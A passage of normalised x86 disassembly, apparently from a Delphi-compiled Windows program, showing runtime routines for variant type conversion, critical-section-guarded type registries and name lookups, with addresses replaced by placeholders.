push sub_411f68
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411a76 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404e98
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404e44
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_40987c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404e98
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_40987c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404e98
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_40b8c4
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404e98
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40b8c4
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404e98
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_41174c
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4050e8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_411784
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4050e8
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_405924
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4050e8
jmp r-xdata
lea edx [ ebp - 0x20 ]
movzx eax [ ebx + 0x8 ]
call sub_4117bc
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4050e8
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_40987c
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404e98
jmp r-xdata
lea edx [ ebp - 0x28 ]
movzx eax [ ebx + 0x8 ]
call sub_40987c
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_404e98
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_40987c
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_404e98
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_409968
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_404e98
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_409968
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_404e98
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_411a3c
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_411884
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_404e98
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411f6f
lea eax [ ebp - 0x74 ]
mov edx 0x7
call sub_404e68
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_405684
lea eax [ ebp - 0x4c ]
mov edx 0xb
call sub_404e68
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_405684
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404e68
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_411950
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_404e98
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404e98
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_410c80
test ah 0x40
je r-xdata
mov eax esi
call sub_404e44
mov edx eax
mov eax ebx
call sub_4119b4
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_411884
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_404e98
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_411884
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_404e98
jmp r-xdata
jmp [ eax * 4 + jump_table_411cfe ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_40987c
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_404e98
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_40987c
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_404e98
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_40b8c4
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_404e98
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_40b8c4
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_404e98
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_41174c
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_4050e8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_411784
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4050e8
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_40506c
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4117bc
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4050e8
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_40987c
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404e98
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_40987c
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_404e98
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_40987c
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_404e98
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_409968
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_404e98
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_409968
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_404e98
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_411a3c
jmp r-xdata
sub_411f78
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412022
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412005
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x8
call sub_4110c0
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_405780
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_405924
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41200c
lea eax [ ebp - 0x10 ]
call sub_4113e0
retn
sub_412030
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412086
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_411708
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_41215c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41208d
lea eax [ ebp - 0x10 ]
call sub_4113e0
retn
sub_412094
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_41214c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
movzx eax [ ebx ]
call sub_412dc0
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412153
lea eax [ ebp - 0x20 ]
call sub_40566c
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41212f
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_405780
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_405924
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_4113e0
retn
sub_41215c
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4126a1
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_412195 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4057bc
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_40566c
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_40987c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4057bc
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_40987c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4057bc
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_40b8c4
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4057bc
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40b8c4
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_4057bc
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_41174c
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4056a8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_411784
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4056a8
jmp r-xdata
push esi
mov eax [ ebx + 0x8 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_405924
jmp r-xdata
lea edx [ ebp - 0x1c ]
movzx eax [ ebx + 0x8 ]
call sub_4117bc
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4056a8
jmp r-xdata
lea edx [ ebp - 0x20 ]
movsx eax [ ebx + 0x8 ]
call sub_40987c
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4057bc
jmp r-xdata
lea edx [ ebp - 0x24 ]
movzx eax [ ebx + 0x8 ]
call sub_40987c
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4057bc
jmp r-xdata
lea edx [ ebp - 0x28 ]
movzx eax [ ebx + 0x8 ]
call sub_40987c
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_4057bc
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x2c ]
call sub_409968
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_4057bc
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x30 ]
call sub_409968
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_4057bc
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_41215c
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_411f78
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_4056a8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4126a8
lea eax [ ebp - 0x70 ]
mov edx 0x2
call sub_405684
lea eax [ ebp - 0x68 ]
mov edx 0x5
call sub_404e68
lea eax [ ebp - 0x54 ]
mov edx 0x3
call sub_405684
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_404e68
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_405684
lea eax [ ebp - 0x30 ]
mov edx 0x5
call sub_404e68
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_405684
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404e68
retn
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_412030
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_4056a8
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4057bc
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_410c80
test ah 0x40
je r-xdata
mov eax esi
call sub_40566c
mov edx eax
mov eax ebx
call sub_412094
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_411f78
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_4056a8
lea edx [ ebp - 0x6c ]
mov eax ebx
call sub_411f78
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_4056a8
jmp r-xdata
jmp [ eax * 4 + jump_table_412410 ]
lea edx [ ebp - 0x3c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_40987c
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_4057bc
jmp r-xdata
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_40987c
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_4057bc
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x44 ]
call sub_40b8c4
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_4057bc
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_40b8c4
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_4057bc
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x4c ]
call sub_41174c
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_4056a8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_411784
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_4056a8
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_405780
jmp r-xdata
lea edx [ ebp - 0x54 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4117bc
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4056a8
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_40987c
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4057bc
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_40987c
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4057bc
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_40987c
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_4057bc
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x64 ]
call sub_409968
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_4057bc
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x68 ]
call sub_409968
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_4057bc
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_41215c
jmp r-xdata
sub_4126b0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_411364
mov [ edi ] 0x3
movsx eax bl
movzx eax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_4126ec
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_411364
sub_412718
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_411364
sub_41277c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_404e98
pop esi
pop ebx
retn
mov eax ebx
call sub_411364
sub_4127a8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_405924
pop esi
pop ebx
retn
mov eax ebx
call sub_411364
sub_412964
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412a8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_404e98
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_404e98
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_412dc0
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_404e98
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_405170
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_409990
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_405170
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403e44
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402ec0
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4050a8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412a91
lea eax [ ebp - 0x208 ]
call sub_404e44
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_405170
sub_412b0c
inc [ eax + 0x7 ]
inc ecx
add [ eax ] cl
push esi
popad
jb r-xdata
sbb edi edi
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
movzx eax [ esi ]
call sub_412dc0
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_412d40
movzx eax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_412b1c
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_412b7d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_406248
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412b84
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_403f64
sub_412bcc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_412d40
lea edx [ ebp - 0x8 ]
movzx eax [ esi ]
call sub_412dc0
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_412c20
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
movzx eax [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
movzx eax [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_412c58
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_412d40
movzx eax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_412c94
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_404330
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_412cf7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412cfe
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_412d98
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_404018
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_412dc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_412e68
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_406248
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_412e7c
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_412f52
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_412f35
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_406250
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412f3c
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_403e44
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_4050a8
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_4092e0
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_412f6c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_412fdb
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412fe2
retn
call sub_412b1c
push rw-data
call DeleteCriticalSection
mov eax rw-data
call sub_4113f4
mov eax rw-data
call sub_404e44
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_405af0
mov eax rw-data
mov edx [ r-xdata ]
call sub_406410
sub_413134
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_413180
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_413128
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_4099e8
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_413134
mov edx [ rw-data ]
mov eax esi
call sub_4092e0
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_4092e0
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_4099e8
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_4131e4
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
